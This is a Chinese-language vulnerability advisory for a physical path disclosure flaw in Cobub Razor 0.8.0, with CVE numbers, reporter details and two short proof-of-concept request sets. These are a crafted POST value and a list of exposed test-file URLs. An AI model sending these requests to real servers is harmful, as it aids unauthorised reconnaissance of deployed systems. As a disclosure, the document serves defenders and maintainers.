### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|Cobub Razor 0.8.0存在物理路径泄露漏洞|2018-04-20|Kyhvedn（yinfengwuyueyi@163.com、kyhvedn@5ecurity.cn）|[http://www.cobub.com/](http://www.cobub.com/) | [https://github.com/cobub/razor/](https://github.com/cobub/razor/) | 0.8.0| [CVE-2018-8056](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8056)/[CVE-2018-8770](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8770)|  

#### 漏洞概述  

> Cobub Razor 0.8.0存在物理路径泄露漏洞，当访问特定url时，系统会显示物理路径信息。Cobub Razor是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过[issues](https://github.com/cobub/razor/issues/162)告知作者。   

### POC实现代码如下：  

> 方法一：  

``` raw
URL: http://localhost/export.php
HTTP Method: GET
URL: http://localhost/index.php?/manage/channel/addchannel
HTTP Method: POST
Data: channel_name=test"&platform=1
```
> 方法二：  
> Cobub Razor 0.8.0存在物理路径泄露漏洞，当访问特定url时，系统会显示物理路径信息。Cobub Razor是一个在github上开源的系统。

``` raw
HTTP Method: GET
http://localhost/tests/generate.php
http://localhost/tests/controllers/getConfigTest.php
http://localhost/tests/controllers/getUpdateTest.php
http://localhost/tests/controllers/postclientdataTest.php
http://localhost/tests/controllers/posterrorTest.php
http://localhost/tests/controllers/posteventTest.php
http://localhost/tests/controllers/posttagTest.php
http://localhost/tests/controllers/postusinglogTest.php
http://localhost/tests/fixtures/Controller_fixt.php
http://localhost/tests/fixtures/Controller_fixt2.php
http://localhost/tests/fixtures/view_fixt2.php
http://localhost/tests/libs/ipTest.php
http://localhost/tests/models/commonDbfix.php
```
